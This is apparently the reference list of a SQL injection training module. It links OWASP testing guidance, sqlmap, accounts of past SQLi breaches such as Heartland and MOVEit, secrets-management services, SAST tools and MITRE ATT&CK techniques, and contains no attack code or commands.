- [OWASP Web Security Testing Guide — Testing for SQL Injection](https://owasp.org/www-project-web-security-testing-guide/). — the offensive methodology (WSTG-INPV-05).
- [OWASP Top 10:2025](https://owasp.org/Top10/). — A05 Injection.
- [sqlmap](https://sqlmap.org/). — the tool that automates the entire §2 sequence; understanding it by hand first is the point of this level.
- [Heartland Payment Systems 2008 Albert Gonzalez (SQLi methodology)](https://en.wikipedia.org/wiki/Albert_Gonzalez).
- [Heartland breach scope](https://en.wikipedia.org/wiki/Heartland_Payment_Systems#Security_breach).
- [Sony Pictures / LulzSec 2011 Wikipedia (LulzSec)](https://en.wikipedia.org/wiki/LulzSec).
- [TalkTalk 2015 ICO investigation account](https://ico.org.uk/about-the-ico/media-centre/talktalk-cyber-attack-how-the-ico-investigation-unfolded/).
- [MOVEit Transfer 2023 (CVE-2023-34362) NVD entry](https://nvd.nist.gov/vuln/detail/CVE-2023-34362).
- [CISA advisory AA23-158A](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-158a).
- [CIS Critical Security Controls v8.1](https://www.cisecurity.org/controls/cis-controls-list). — Control 16 (Application Software Security), Control 3 (Data Protection).
- [U.S. Dept. of Education — FERPA](https://studentprivacy.ed.gov/ferpa). — 20 U.S.C. § 1232g; 34 CFR Part 99.
- [AWS Secrets Manager](https://docs.aws.amazon.com/secretsmanager/latest/userguide/intro.html).
- [HashiCorp Vault](https://developer.hashicorp.com/vault/docs/secrets).
- [GCP Secret Manager](https://docs.cloud.google.com/secret-manager/docs).
- [Azure Key Vault](https://learn.microsoft.com/en-us/azure/key-vault/general/overview).
- [Semgrep](https://semgrep.dev/).
- [CodeQL](https://codeql.github.com/). — SAST tools with SQL-injection rule packs for the CI gate.
- [T1190 — Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/).
- [T1213 — Data from Information Repositories](https://attack.mitre.org/techniques/T1213/).
- [T1552 — Unsecured Credentials](https://attack.mitre.org/techniques/T1552/).
- [T1078 — Valid Accounts](https://attack.mitre.org/techniques/T1078/).
